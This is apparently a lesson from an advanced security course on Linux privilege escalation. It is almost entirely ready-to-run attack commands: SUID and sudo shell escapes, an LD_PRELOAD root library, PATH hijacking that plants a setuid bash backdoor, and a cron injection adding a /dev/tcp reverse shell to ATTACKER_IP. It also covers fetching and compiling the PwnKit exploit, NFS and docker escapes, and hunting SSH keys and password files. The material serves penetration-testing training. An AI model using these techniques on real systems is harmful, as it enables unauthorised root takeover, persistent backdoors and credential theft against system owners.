# 22 — Privilege Escalation

> **Security Advanced · Module 2** | Difficulty: ★★★★★ Expert | Time: ~120 min

---

## Learning Objectives

- Enumerate privilege escalation vectors systematically
- Exploit SUID/SGID misconfigurations
- Abuse sudo permissions
- Exploit cron jobs and writable paths
- Escalate via kernel exploits
- Use LinPEAS and other automation tools

---

## 1. Enumeration — The Key to PrivEsc

```bash
# Run LinPEAS for comprehensive enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Key areas to check:
```

### System Information

```bash
uname -a                        # kernel version
cat /etc/issue
cat /etc/*-release
cat /proc/version
hostname
env                             # environment variables
cat /etc/profile                # global profile
cat ~/.bashrc ~/.bash_profile   # user profiles
```

### User and Sudo

```bash
id
whoami
sudo -l                         # CRITICAL — what can I run as root?
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
```

### SUID/SGID Binaries

```bash
# Find all SUID binaries
find / -type f -perm -4000 2>/dev/null | sort

# Find all SGID binaries
find / -type f -perm -2000 2>/dev/null | sort

# Check against GTFOBins: gtfobins.github.io
```

### World-Writable Files and Directories

```bash
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | sort
```

### Cron Jobs

```bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null
# Check if scripts run by cron are writable!
find /etc/cron* -writable 2>/dev/null
```

### Capabilities

```bash
# Linux capabilities — fine-grained privileges
/usr/sbin/getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid       — change UID → root
# cap_net_raw      — raw sockets
# cap_sys_admin    — many privileges
# cap_dac_override — bypass file permissions

# Exploit cap_setuid example (python has cap_setuid)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploit cap_net_bind_service → can bind port <1024
# Exploit via tcpdump with cap_net_raw
tcpdump -i eth0 -w /tmp/capture.pcap &
```

---

## 2. GTFOBins Exploitation

**GTFOBins** (gtfobins.github.io) catalogs Unix binaries that can be abused.

### Common SUID Exploits

```bash
# Check which SUID binaries are unusual
find / -perm -4000 2>/dev/null | xargs ls -la

# vim with SUID
vim.tiny -c ':!/bin/bash -p'
vim.tiny -c ':py3 import os; os.execl("/bin/bash","bash","-p")'

# find with SUID
find / -exec /bin/bash -p \; -quit

# bash with SUID (rare but possible)
/bin/bash -p

# nmap with SUID (old versions)
nmap --interactive
!sh

# env with SUID
env /bin/bash -p

# awk with SUID
awk 'BEGIN {system("/bin/bash -p")}'

# cp with SUID (copy /etc/passwd)
LFILE=/etc/passwd
cp "$LFILE" .

# openssl with SUID (read files)
openssl enc -in /etc/shadow

# python with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl with SUID
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Sudo Exploits

```bash
# sudo -l shows something like:
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (root) NOPASSWD: /usr/bin/less
sudo less /etc/shadow
!/bin/bash

# (root) NOPASSWD: /usr/bin/man
sudo man man
!/bin/bash

# (root) NOPASSWD: /usr/bin/git
sudo git help config
!/bin/bash

# (root) NOPASSWD: /usr/bin/ftp
sudo ftp
!/bin/bash

# (root) NOPASSWD: /usr/bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# (root) NOPASSWD: /usr/bin/zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

# Sudo LD_PRELOAD trick
# sudoers: Defaults env_keep += "LD_PRELOAD"
cat << 'EOF' > /tmp/evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so find   # any sudo command
```

---

## 3. Path Abuse

```bash
# If a SUID binary calls a command without full path:
# e.g., it runs: system("ps") instead of system("/bin/ps")

# Check PATH hijacking opportunity:
strings /suid_binary | grep -v "/" | grep "^[a-z]"   # relative commands

# Create malicious binary in writable PATH location
mkdir -p /tmp/privesc
cd /tmp/privesc
echo '#!/bin/bash' > ps
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> ps
chmod +x ps
export PATH=/tmp/privesc:$PATH

# Run the vulnerable SUID binary
/usr/local/bin/suid_binary

# Execute backdoor shell
/tmp/rootbash -p
```

---

## 4. Cron Job Exploitation

```bash
# Scenario: /etc/crontab contains:
# * * * * * root /opt/backup/clean.sh

# Step 1: Check permissions on the script
ls -la /opt/backup/clean.sh
# -rwxrwxrwx → world-writable!

# Step 2: Add reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup/clean.sh

# Step 3: Catch the shell
# nc -lvnp 4444

# Directory writability (script not writable but dir is):
ls -la /opt/backup/
# drwxrwxrwx  ← writable directory
mv /opt/backup/clean.sh /opt/backup/clean.sh.bak
echo '#!/bin/bash' > /opt/backup/clean.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup/clean.sh
chmod +x /opt/backup/clean.sh
```

---

## 5. Kernel Exploits

```bash
# Check kernel version
uname -r
# 4.4.0-116-generic

# Search for exploits
searchsploit linux kernel 4.4.0

# Common kernel exploits:
# CVE-2021-4034 (PwnKit)     — polkit, most Linux distros
# CVE-2022-0847 (DirtyPipe)  — kernel 5.8-5.16
# CVE-2021-3156 (Baron Samedit) — sudo heap overflow
# CVE-2019-13272 (PTRACE_TRACEME) — kernel 5.1.17

# PwnKit (CVE-2021-4034) — one of the most widespread
# Check if vulnerable
dpkg -l | grep policykit-1
# politikit < 0.105-26ubuntu (Ubuntu)

# Download and compile PwnKit PoC
cd /tmp
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit

# DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
# Allows overwriting read-only files
# Example: overwrite /etc/passwd
```

---

## 6. Credential Hunting

```bash
# Find passwords in config files
grep -r "password" /etc/ 2>/dev/null | grep -v "#" | grep -v Binary
grep -r "passwd" /var/www/ 2>/dev/null | grep -v Binary
grep -r "DB_PASS" /var/www/ 2>/dev/null

# Common locations
cat /var/www/html/config.php
cat /var/www/html/wp-config.php    # WordPress credentials
cat /home/*/.ssh/id_rsa            # SSH private keys
cat /home/*/.ssh/id_ed25519
cat /root/.ssh/id_rsa
cat /etc/mysql/debian.cnf          # MySQL root credentials
cat /etc/phpmyadmin/config-db.php

# Service credential files
find /etc -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find / -name "*.swp" 2>/dev/null   # vim swap files
find / -name "*.old" 2>/dev/null
find / -name ".htpasswd" 2>/dev/null
find / -name "*.xml" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Check history files
cat ~/.bash_history | grep -i "pass\|pw\|key\|secret"
cat ~/.mysql_history
cat ~/.python_history

# Memory (if you can read it)
strings /proc/*/environ 2>/dev/null | grep -i "pass\|key\|token\|secret"
```

---

## 7. NFS Privilege Escalation

```bash
# Check NFS exports
cat /etc/exports

# Vulnerable setting:
# /home/share *(rw,no_root_squash)
# no_root_squash means: root on client = root on server!

# From attacker machine:
showmount -e TARGET_IP
mkdir /mnt/nfs_share
mount -t nfs TARGET_IP:/home/share /mnt/nfs_share/

# Create SUID shell
cp /bin/bash /mnt/nfs_share/suid_bash
chmod +s /mnt/nfs_share/suid_bash

# Back on target:
/home/share/suid_bash -p
```

---

## 8. Docker Privilege Escalation

```bash
# If the user is in the docker group:
id | grep docker

# Create privileged container with host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Now you have root access to the entire host filesystem!
cat /mnt/etc/shadow    # or just chroot /mnt sh to get a shell
```

---

## Practice Lab — CTF-Style PrivEsc

```bash
# Setup: SSH into a machine with limited privileges
# Goal: Get root shell

# Step 1: Basic enumeration
id
sudo -l
find / -perm -4000 2>/dev/null

# Step 2: Look for obvious wins
# - Writable cron scripts?
# - SUID on common programs?
# - Credentials in config files?

# Step 3: Use LinPEAS
/tmp/linpeas.sh | grep -E "yellow|red"

# Step 4: Exploit the vector
# (varies based on what you found)

# Verify root
id  # → uid=0(root)
cat /etc/shadow | head -3
cat /root/root.txt  # CTF flag!
```

---

## Key Takeaways

- **Enumeration is everything** — LinPEAS + manual checks
- **GTFOBins** catalogs exploitation for 100+ common programs
- **SUID** + unusual binaries = check GTFOBins immediately
- **Sudo -l** is the first check — often directly exploitable
- **Cron jobs** with world-writable scripts = easy root
- **Kernel exploits** as last resort (PwnKit is extremely widespread)
- **Credentials in files** — config files, .history, .swp, backups
- Document every step for the report!

---

➡️ [23 — Cryptography Fundamentals](23_Cryptography_Fundamentals.md)

*Security Advanced · Lesson 2 of 8 | [Course Index](../INDEX.md)*
